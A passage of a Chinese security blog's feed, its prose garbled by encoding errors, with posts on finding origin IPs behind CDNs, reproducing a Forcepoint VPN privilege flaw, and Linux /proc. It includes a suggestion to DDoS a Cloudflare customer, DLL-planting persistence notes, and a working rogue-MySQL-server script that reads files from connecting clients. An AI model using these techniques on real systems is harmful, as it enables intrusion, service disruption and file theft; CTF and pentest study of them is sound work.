rel="noopener">www.baidu.com</a></p><p>å†æ”¾ä¸€ä¸ªæœé›†è¯ä¹¦çš„ç½‘ç«™<a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh</a></p><p>ä¸€ä¸ªå°è„šæœ¬ï¼Œå¯ä»¥å¿«é€Ÿæœé›†è¯ä¹¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019-10-08 22:51</span></span><br><span class="line"><span class="comment"># @Author  : Patrilic</span></span><br><span class="line"><span class="comment"># @FileName: SSL_subdomain.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">TIME_OUT = <span class="number">60</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_SSL</span><span class="params">(domain)</span>:</span></span><br><span class="line">    domains = []</span><br><span class="line">    url = <span class="string">'https://crt.sh/?q=%25.&#123;&#125;'</span>.format(domain)</span><br><span class="line">    response = requests.get(url,timeout=TIME_OUT)</span><br><span class="line">    <span class="comment"># print(response.text)</span></span><br><span class="line">    ssl = re.findall(<span class="string">"&lt;TD&gt;(.*?).&#123;&#125;&lt;/TD&gt;"</span>.format(domain),response.text)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ssl:</span><br><span class="line">        i += <span class="string">'.'</span> + domain</span><br><span class="line">        domains.append(i)</span><br><span class="line">    print(domains)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    get_SSL(<span class="string">"baidu.com"</span>)</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§æ–¹å¼ï¼Œå°±æ˜¯æœé›†SSLè¯ä¹¦Hashï¼Œç„¶åéå†ipå»æŸ¥è¯¢è¯ä¹¦hashï¼Œå¦‚æœåŒ¹é…åˆ°ç›¸åŒçš„ï¼Œè¯æ˜è¿™ä¸ªipå°±æ˜¯é‚£ä¸ª åŸŸååŒæ ¹è¯ä¹¦çš„æœåŠ¡å™¨çœŸå®ip</p><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯éå†0.0.0.0/0:443ï¼Œé€šè¿‡ipè¿æ¥httpsæ—¶ï¼Œä¼šæ˜¾ç¤ºè¯ä¹¦</p><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç”¨censysç­‰å¼•æ“<br><img src="/Bypass CDN å¯»æ‰¾çœŸå®IP.resources/82C66A85-0718-4D35-BF78-4BC6F8D66137.png" alt="88c410f42542b4d8b7387ca70ca55e68"></p><h3 id="åè¿œåœ°åŒºæœåŠ¡å™¨è®¿é—®"><a href="#åè¿œåœ°åŒºæœåŠ¡å™¨è®¿é—®" class="headerlink" title="åè¿œåœ°åŒºæœåŠ¡å™¨è®¿é—®"></a>åè¿œåœ°åŒºæœåŠ¡å™¨è®¿é—®</h3><p>åœ¨åè¿œåœ°åŒºçš„æœåŠ¡å™¨è®¿é—®æ—¶ï¼Œå¯èƒ½ä¸ä¼šè®¿é—®åˆ°CDNèŠ‚ç‚¹ï¼Œè€Œæ˜¯ç›´æ¥è®¿é—®æœåŠ¡å™¨çœŸå®ip</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æä¸€ä¸ªåè¿œåœ°åŒºçš„ä»£ç†æ± ï¼Œæ¥è®¿é—®ç›®æ ‡åŸŸåï¼Œæœ‰æ¦‚ç‡å°±å¯ä»¥æ‹¿åˆ°çœŸå®ip</p><p>ä¹Ÿå°±æ˜¯å¹³å¸¸è¯´çš„å¤šåœ°Ping<br><img src="/Bypass CDN å¯»æ‰¾çœŸå®IP.resources/B6C9E83C-9951-4397-9929-995ABDA0F31A.png" alt="766172367254161b3f5a2d0e44e0174d"></p><h3 id="favicon-hashåŒ¹é…"><a href="#favicon-hashåŒ¹é…" class="headerlink" title="favicon_hashåŒ¹é…"></a>favicon_hashåŒ¹é…</h3><p>åˆ©ç”¨shodançš„<strong>http.favicon.hash</strong>è¯­æ³•ï¼Œæ¥åŒ¹é…iconçš„hashå€¼</p><p>ç›´æ¥æ¨<a href="https://github.com/Ridter/get_ip_by_ico/blob/master/get_ip_by_ico.py" target="_blank" rel="noopener">https://github.com/Ridter/get_ip_by_ico/blob/master/get_ip_by_ico.py</a></p><p><a name="iWsmO"></a></p><h3 id="CloudFlare-Bypass"><a href="#CloudFlare-Bypass" class="headerlink" title="CloudFlare Bypass"></a>CloudFlare Bypass</h3><p>å…è´¹ç‰ˆçš„cfï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡DDOSæ¥æ¶ˆè€—å¯¹æ–¹çš„æµé‡ï¼Œåªéœ€è¦æŠŠæµé‡æ‰“å…‰ï¼Œå°±ä¼šå›æ»šåˆ°åŸå§‹ip</p><p>è¿˜æœ‰åˆ©ç”¨cloudflareçš„æ”¹hostè¿”å›ç¤ºä¾‹:<br><a href="https://blog.detectify.com/2019/07/31/bypassing-cloudflare-waf-with-the-origin-server-ip-address/" target="_blank" rel="noopener">https://blog.detectify.com/2019/07/31/bypassing-cloudflare-waf-with-the-origin-server-ip-address/</a><br>é‡Œé¢ç»™äº†è¯¦ç»†çš„ä»‹ç»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡HOSTæ¥åˆ¤æ–­æ˜¯å¦æ˜¯çœŸå®ip<br>å…·ä½“çœ‹æ–‡ç« å³å¯</p><p><a name="gmuNS"></a></p><h3 id="å¥‡ç‰¹çš„ping"><a href="#å¥‡ç‰¹çš„ping" class="headerlink" title="å¥‡ç‰¹çš„ping"></a>å¥‡ç‰¹çš„ping</h3><p>æ¯”å¦‚å¯èƒ½æœ‰äº›åœ°æ–¹ï¼Œä½¿ç”¨çš„CDNéƒ½æ˜¯ä»¥<a href="http://www.xxx.edu.cnï¼Œä¾‹å¦‚www.cuit.edu.cn,www.jwc.cuit.edu.cn" target="_blank" rel="noopener">www.xxx.edu.cnï¼Œä¾‹å¦‚www.cuit.edu.cn,www.jwc.cuit.edu.cn</a></p><p>å¯èƒ½å»æ‰å‰ç¼€çš„wwwï¼Œå°±å¯èƒ½ç»•è¿‡CDNäº†ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯ç±»ä¼¼äºApache VirtualHost</p><p>å¯å‚è€ƒ<a href="https://httpd.apache.org/docs/2.4/en/vhosts/examples.html" target="_blank" rel="noopener">https://httpd.apache.org/docs/2.4/en/vhosts/examples.html</a></p><p>ä¾‹å¦‚ï¼š<br><img src="/Bypass CDN å¯»æ‰¾çœŸå®IP.resources/D368AA5E-A66E-46A8-9E96-7B439AB7E059.png" alt="94f6e57f5f9c038766a278c76f46ce30"></p><p>æˆ‘è¿™é‡Œå…¶å®æ˜¯pingäº†<a href="http://www.xxx.gov.cnå’Œxxx.gov.cn" target="_blank" rel="noopener">www.xxx.gov.cnå’Œxxx.gov.cn</a></p><p>è¿™æ ·å°±å¯ä»¥ç»•è¿‡CDNçš„æ£€æµ‹</p><p><a name="kroXV"></a></p><h3 id="åˆ©ç”¨è€åŸŸå"><a href="#åˆ©ç”¨è€åŸŸå" class="headerlink" title="åˆ©ç”¨è€åŸŸå"></a>åˆ©ç”¨è€åŸŸå</h3><p>åœ¨æ¢æ–°åŸŸåæ—¶ï¼Œå¸¸å¸¸å°†CDNéƒ¨ç½²åˆ°æ–°çš„åŸŸåä¸Šï¼Œè€Œè€åŸŸåç”±äºæ²¡è¿‡æœŸï¼Œå¯èƒ½æœªä½¿ç”¨CDNï¼Œç„¶åå°±å¯ä»¥ç›´æ¥è·å–æœåŠ¡å™¨çœŸå®ipã€‚</p><p>ä¾‹å¦‚patrilic.top &gt; patrilic.com<br>åŸŸåæ›´æ–°æ—¶ï¼Œå¯èƒ½è€åŸŸååŒæ—¶è§£æåˆ°çœŸå®æœåŠ¡å™¨ï¼Œä½†æ˜¯æ²¡æœ‰éƒ¨ç½²CDN</p><p>è¿™ä¸ªå¯ä»¥é€šè¿‡æœé›†åŸŸåå¤‡æ¡ˆçš„é‚®ç®±å»åæŸ¥ï¼Œå¯èƒ½ä¼šæœ‰æ„å¤–æ”¶è·</p><h3 id="æš´åŠ›åŒ¹é…"><a href="#æš´åŠ›åŒ¹é…" class="headerlink" title="æš´åŠ›åŒ¹é…"></a>æš´åŠ›åŒ¹é…</h3><p>æ‰¾åˆ°ç›®æ ‡æœåŠ¡å™¨IPæ®µåï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œæš´åŠ›åŒ¹é… ï¼Œä½¿ç”¨masscanæ‰«æHTTP bannerï¼Œç„¶ååŒ¹é…åˆ°ç›®æ ‡åŸŸåçš„ç›¸åŒbanner</p><h3 id="DDos-ç¤¾å·¥CDNå¹³å°ç­‰"><a href="#DDos-ç¤¾å·¥CDNå¹³å°ç­‰" class="headerlink" title="DDos/ç¤¾å·¥CDNå¹³å°ç­‰"></a>DDos/ç¤¾å·¥CDNå¹³å°ç­‰</h3><h2 id="0x02-å…¶ä»–æ–¹æ³•"><a href="#0x02-å…¶ä»–æ–¹æ³•" class="headerlink" title="0x02 å…¶ä»–æ–¹æ³•"></a>0x02 å…¶ä»–æ–¹æ³•</h2><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p><img src="/Bypass CDN å¯»æ‰¾çœŸå®IP.resources/6CC86789-CDCC-47CA-9940-744FBC32274E.png" alt="cd01f0e2811d6b9828927bfe6c57f8b3"></p><h3 id="ssrfï¼Œæ–‡ä»¶ä¸Šä¼ ç­‰æ¼æ´"><a href="#ssrfï¼Œæ–‡ä»¶ä¸Šä¼ ç­‰æ¼æ´" class="headerlink" title="ssrfï¼Œæ–‡ä»¶ä¸Šä¼ ç­‰æ¼æ´"></a>ssrfï¼Œæ–‡ä»¶ä¸Šä¼ ç­‰æ¼æ´</h3><p>ç•¥..</p><p><a name="gEBoP"></a></p><h2 id="0x03-å‚è€ƒé“¾æ¥ğŸ”—"><a href="#0x03-å‚è€ƒé“¾æ¥ğŸ”—" class="headerlink" title="0x03 å‚è€ƒé“¾æ¥ğŸ”—"></a>0x03 å‚è€ƒé“¾æ¥ğŸ”—</h2><p><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">https://github.com/shmilylty/OneForAll</a><br><a href="https://github.com/FeeiCN/ESD" target="_blank" rel="noopener">https://github.com/FeeiCN/ESD</a><br><a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a><br><a href="https://github.com/AI0TSec/blog/issues/8" target="_blank" rel="noopener">https://github.com/AI0TSec/blog/issues/8</a><br><a href="https://www.4hou.com/tools/8251.html" target="_blank" rel="noopener">https://www.4hou.com/tools/8251.html</a><br><a href="https://www.freebuf.com/sectool/112583.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/112583.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-10-09 13:12:49&lt;br&gt;&lt;img src=&quot;/wallpaper/futuristic.jpeg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00
      
    
    </summary>
    
      <category term="Pentest Cheat Sheet" scheme="http://patrilic.top/categories/Pentest-Cheat-Sheet/"/>
    
    
      <category term="Bypass CDN" scheme="http://patrilic.top/tags/Bypass-CDN/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-6145  Forcepoint VPN</title>
    <link href="http://patrilic.top/2019/09/27/CVE-2019-6145%20%20Forcepoint%20VPN/"/>
    <id>http://patrilic.top/2019/09/27/CVE-2019-6145  Forcepoint VPN/</id>
    <published>2019-09-26T16:03:55.000Z</published>
    <updated>2019-09-27T06:52:31.916Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-09-27 0:03:55<br><img src="/wallpaper/anime.jpg" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ç¾¤é‡Œå¸ˆå‚…ä¼ äº†ä¸€ç¯‡æ¼æ´è¯¦æƒ…ï¼Œå¦‚ä¸‹ï¼š<br><a href="https://www.4hou.com/vulnerable/20515.html" target="_blank" rel="noopener">https://www.4hou.com/vulnerable/20515.html</a></p><p>å…¶ä¸­ç¿»åˆ°è¿™ä¸ªçš„æ—¶å€™ï¼š<br><img src="/CVE-2019-6145  Forcepoint VPN.resources/68BEF323-598F-4DF8-80DB-1D6793F8D6B7.png" alt="a80184c994256c62b68309752428a068"></p><p>è¿™ä¸å°±æ˜¯ç™½åŠ é»‘ä¹ˆ..è¿˜èƒ½è‡ªå¯ï¼Œå²‚ä¸ç¾å“‰ï½</p><h2 id="0x01-æ¼æ´å¤ç°"><a href="#0x01-æ¼æ´å¤ç°" class="headerlink" title="0x01 æ¼æ´å¤ç°"></a>0x01 æ¼æ´å¤ç°</h2><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><blockquote><p>Forcepoint VPN Windows Client &lt; 6.6.1</p></blockquote><h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p><img src="/CVE-2019-6145  Forcepoint VPN.resources/0F0DCA0F-6513-4706-99ED-496E97F42D6E.png" alt="b565f7eb7008dae50e9cffef5140d7b0"><br><img src="/CVE-2019-6145  Forcepoint VPN.resources/ED60C5CC-3A68-4AD1-8D96-591E1BC1ADBE.png" alt="240c6b110481cf8ad45fadf90f90bd38"></p><p>å®‰è£…çš„æ—¶å€™ä¼šè°ƒç”¨<code>msiexec.exe</code>ï¼Œä½¿ç”¨é©±åŠ¨åŠ è½½<code>NT/SYSTEM</code></p><p>ç„¶åä¿è¯è‡ªå¯åŠ¨ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬èƒ½æ‘¸åˆ°è·¯å¾„å°±èƒ½æŒä¹…æ§åˆ¶</p><p>æ‰“å¼€ç¨‹åºï¼Œæˆ‘ä»¬å‘ç°ä»–ä¼šå»æŸ¥è¯¢ä¸€äº›ä¸å­˜åœ¨çš„ç›®å½•å’Œç¨‹åº<br><img src="/CVE-2019-6145  Forcepoint VPN.resources/A0273E78-14DF-4D99-9191-69B446967C1A.png" alt="9cb5f6b66d8398fa197331f3ac360091"></p><p><img src="/CVE-2019-6145  Forcepoint VPN.resources/02015B80-4E63-4E3F-9636-B2D3B7BC126A.png" alt="e556b1bc632f8bc055b6631bab814364"><br><img src="/CVE-2019-6145  Forcepoint VPN.resources/0900E779-7DB6-4822-B27D-D62C34A17472.png" alt="8c750183f70b3a62663bdfcf5d0b7be2"></p><h2 id="0x02-æ¼æ´åŸç†"><a href="#0x02-æ¼æ´åŸç†" class="headerlink" title="0x02 æ¼æ´åŸç†"></a>0x02 æ¼æ´åŸç†</h2><p>çœ‹è¿™ä¸ªå°±å¥½äº†<br><a href="https://www.4hou.com/vulnerable/20515.html" target="_blank" rel="noopener">https://www.4hou.com/vulnerable/20515.html</a></p><p>æš´é£å“­æ³£ï¼Œä¸ä¼š</p><p>ï¼ˆæˆ‘æ˜¯ä¸€ä¸ªæ²¡æœ‰æ„Ÿæƒ…çš„å¤ç°æœºå™¨ï¼‰</p><h2 id="0x03-å…æ€"><a href="#0x03-å…æ€" class="headerlink" title="0x03 å…æ€"></a>0x03 å…æ€</h2><p><img src="/CVE-2019-6145  Forcepoint VPN.resources/44A7E077-1986-4B16-A52D-1287E84C837A.png" alt="c722b31e90a0fd3ac2ff973fe6445c7a"></p><p><img src="/CVE-2019-6145  Forcepoint VPN.resources/6DB73CBB-5076-49AE-A1A7-613CF68C0F8A.png" alt="aee18db9dbe77ac4edcca72af7e3d1b9"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-09-27 0:03:55&lt;br&gt;&lt;img src=&quot;/wallpaper/anime.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="æ¼æ´å¤ç°" scheme="http://patrilic.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Forcepoint VPN" scheme="http://patrilic.top/tags/Forcepoint-VPN/"/>
    
  </entry>
  
  <entry>
    <title>æµ…è°ˆ Linuxç³»ç»Ÿ proc</title>
    <link href="http://patrilic.top/2019/09/11/%E6%B5%85%E8%B0%88%20Linux%E7%B3%BB%E7%BB%9F%20Proc/"/>
    <id>http://patrilic.top/2019/09/11/æµ…è°ˆ Linuxç³»ç»Ÿ Proc/</id>
    <published>2019-09-10T16:44:23.000Z</published>
    <updated>2019-09-10T16:59:01.747Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-9-11 0:44:23<br><img src="/wallpaper/thumb-1920-608362.jpg" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æˆ‘ä»¬ç»å¸¸åœ¨CTFæ¯”èµ›é‡Œï¼Œæˆ–è€…å®é™…æ¸—é€é‡Œï¼Œä½¿ç”¨åˆ°<code>/proc</code>è¿™ä¸ªç›®å½•ï¼Œæ¯”å¦‚å¸¸å¸¸åˆ©ç”¨<code>/proc/self/cwd</code>æ¥è®¿é—®è¿›ç¨‹ä¸­çš„æ–‡ä»¶ï¼Œä½¿ç”¨<code>/proc/self/environ</code>è¯»å–ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ç­‰</p><h2 id="0x01-Proc-åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿"><a href="#0x01-Proc-åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿" class="headerlink" title="0x01 Proc åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿"></a>0x01 Proc åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿</h2><p>å®é™…ä¸Šæˆ‘ä»¬åœ¨ä»»ä½•çš„GUN/Linuxæ“ä½œç³»ç»Ÿé‡Œï¼Œéƒ½èƒ½æ‰¾åˆ°è¿™ä¸ªç›®å½•ï¼Œå¹¶ä¸”é‡Œé¢å­˜åœ¨å¤§é‡ç›®å½•<br><img src="/æµ…è°ˆ Linuxç³»ç»Ÿ Proc.resources/70DE7AC6-D2C4-42A8-8A78-3F631B6515A6.png" alt="f48d8c5a7f26e7be272c7c36a0224e65"><br>ä½†æ˜¯å¦‚æœï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>ls -al</code>æ¥æŸ¥çœ‹<br><img src="/æµ…è°ˆ Linuxç³»ç»Ÿ Proc.resources/F0A39E32-2167-47D3-B6B7-C76BD67C7F3D.png" alt="e39161263565785f4d27eea36ccec527"></p><p>å¯ä»¥çœ‹åˆ°ç»å¤§éƒ¨åˆ†æ–‡ä»¶å¤§å°ä¸º0</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨catå‘½ä»¤è·å–å…¶ä¸­çš„å¤§é‡ä¿¡æ¯<br><img src="/æµ…è°ˆ Linuxç³»ç»Ÿ Proc.resources/C6AC528D-6694-4F8C-A7D8-DD139C74A308.png" alt="cc6935b581357039fa948356e6cc9ea9"></p><p>ä¸ºä»€ä¹ˆ0å­—èŠ‚è¿˜èƒ½å­˜æœ‰å†…å®¹å‘¢</p><p>è¿™é‡Œæåˆ°ä¸€ä¸ªæ¦‚å¿µï¼šæ–‡ä»¶ç³»ç»Ÿ<br>ç»´åŸºç™¾ç§‘-&gt;<a href="https://zh.wikipedia.org/zh-hans/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Procfs</a></p><p>è€Œprocåœ¨Unixé‡Œå¸¸å¸¸è¢«ç§°ä¸ºprocfs -&gt; proc file system<br>å®ƒåŒ…å«ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼ˆå¯åŠ¨æ—¶åŠ¨æ€ç”Ÿæˆçš„æ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œç”¨äºé€šè¿‡å†…æ ¸è®¿é—®è¿›ç¨‹ä¿¡æ¯ã€‚è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿé€šå¸¸è¢«æŒ‚è½½åˆ° /proc ç›®å½•ã€‚ç”±äº /proc ä¸æ˜¯ä¸€ä¸ªçœŸæ­£çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒä¹Ÿå°±ä¸å ç”¨å­˜å‚¨ç©ºé—´ï¼Œåªæ˜¯å ç”¨æœ‰é™çš„å†…å­˜ã€‚</p><p>ç»´åŸºç™¾ç§‘-&gt;<a href="https://zh.wikipedia.org/wiki/Procfs" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Procfs</a></p><p>æ‰€ä»¥è¯´ï¼Œå…¶å®/procç›®å½•æ›´å¤šçš„æ˜¯èµ·åˆ°ä¸€ä¸ªç±»ä¼¼äºæ¥å£çš„ä½œç”¨ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨catå‘½ä»¤è·å–æ—¶ï¼Œå®ƒä¼šä»å†…å­˜ä¸­è·å–ä¿¡æ¯ï¼Œæ¥è¿”å›ç»™ç”¨æˆ·ï¼Œè€Œç›®å½•ä¸­çš„æ•°å­—ï¼Œå…¶å®å°±æ˜¯PIDå·ã€‚</p><ul><li>/proc/$PID/cmdline  å¯åŠ¨è¿›ç¨‹æ—¶æ‰§è¡Œçš„å‘½ä»¤ </li><li>/proc/$PID/environ  è¯¥æ–‡ä»¶ä¿å­˜è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ </li><li>/proc/$PID/cwd  ä¸€ä¸ªç¬¦å·è¿æ¥, æŒ‡å‘è¿›ç¨‹å½“å‰çš„å·¥ä½œç›®å½• </li><li>/proc/$PID/exe  ä¸€ä¸ªç¬¦å·è¿æ¥, æŒ‡å‘è¢«æ‰§è¡Œçš„äºŒè¿›åˆ¶ä»£ç  </li><li>/proc/$PID/fd  è¿›ç¨‹æ‰€æ‰“å¼€çš„æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªç¬¦å·è¿æ¥åœ¨è¯¥å­ç›®å½•é‡Œ, ä»¥æ–‡ä»¶æè¿°ç¬¦å‘½å, è¿™ä¸ªåå­—å®é™…ä¸Šæ˜¯æŒ‡å‘çœŸæ­£çš„æ–‡ä»¶çš„ç¬¦å·è¿æ¥ </li><li>/proc/$PID/attr  è¿›ç¨‹çš„å±æ€§ </li></ul><h2 id="0x02-proc-self"><a href="#0x02-proc-self" class="headerlink" title="0x02 /proc/self"></a>0x02 /proc/self</h2><p>ç›¸å¯¹äºè¿›ç¨‹PIDï¼Œæˆ‘ä»¬åœ¨å®æˆ˜çš„æ–‡ä»¶è¯»å–ä¸­ï¼Œæ›´å¤šä½¿ç”¨çš„æ˜¯<code>/proc/self</code>ç›®å½•ã€‚<br>åœ¨<code>stackexchange</code>æœ‰ä¸€ä¸ªè®¨è®ºï¼Œ<br><a href="https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for</a></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå…¶å®<code>/proc/self</code> æ˜¯æŒ‡å‘å½“å‰è¿›ç¨‹çš„å†…å­˜</p><p>æ¯”å¦‚ä¹‹å‰æŠ¤ç½‘æ¯2019çš„ä¸€é“åˆ©ç”¨ MySQL LOAD DATAç‰¹æ€§è¯»å–æ–‡ä»¶ï¼Œè®©phpè¿œç¨‹è¿æ¥åˆ°æˆ‘ä»¬çš„å®¢æˆ·ç«¯ï¼Œç„¶åå‘é€å‘½ä»¤ï¼Œç”±äºåœ¨è¿œç¨‹æœåŠ¡å™¨æ˜¯ä½¿ç”¨apacheè¿›ç¨‹æ¥è¿æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¯»å–åˆ°<code>/proc/self/cwd/index.php</code><br><img src="/æµ…è°ˆ Linuxç³»ç»Ÿ Proc.resources/0627C538-2DED-428D-9E06-F30859D58EE8.png" alt="c6ca5efffe4e45310d735cfbe4e70b8e"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8 </span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"/proc/self/cwd/index.php"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3306</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>tip: å½“æ‰¾ä¸åˆ°ç½‘ç«™è·¯å¾„çš„æ—¶å€™ï¼Œå¯ä»¥åˆ©ç”¨<code>/proc/self/cwd</code>ç›®å½•æ¥è¯»å–apacheè¿›ç¨‹çš„phpæ–‡ä»¶æºç </p><h2 id="0x03-ç›¸å…³é“¾æ¥ğŸ”—"><a href="#0x03-ç›¸å…³é“¾æ¥ğŸ”—" class="headerlink" title="0x03 ç›¸å…³é“¾æ¥ğŸ”—"></a>0x03 ç›¸å…³é“¾æ¥ğŸ”—</h2><p><a href="https://blog.csdn.net/goodluckwhh/article/details/17010029" target="_blank" rel="noopener">https://blog.csdn.net/goodluckwhh/article/details/17010029</a><br><a href="https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for</a><br><a href="https://www.cnblogs.com/youxin/p/4980058.html" target="_blank" rel="noopener">https://www.cnblogs.com/youxin/p/4980058.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-9-11 0:44:23&lt;br&gt;&lt;img src=&quot;/wallpaper/thumb-1920-608362.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;
      
    
    </summary>
    
      <category term="linux" scheme="http://patrilic.top/categories/linux/"/>
    
    
      <category term="proc" scheme="http://patrilic.top/tags/proc/"/>
    
  </entry>
  
  <entry>
    <title>N1CTF Pentest N1ctf2019.lab Write-up</title>
    <link href="http://patrilic.top/2019/09/10/N1CTF%20%20Pentest%20N1ctf2019.lab%20Write-up/"/>
    <id>http://patrilic.top/2019/09/10/N1CTF  Pentest N1ctf2019.lab Write-up/</id>
    <published>2019-09-09T17:20:33.000Z</published>
    <updated>2019-09-09T15:03:25.597Z</updated>
    
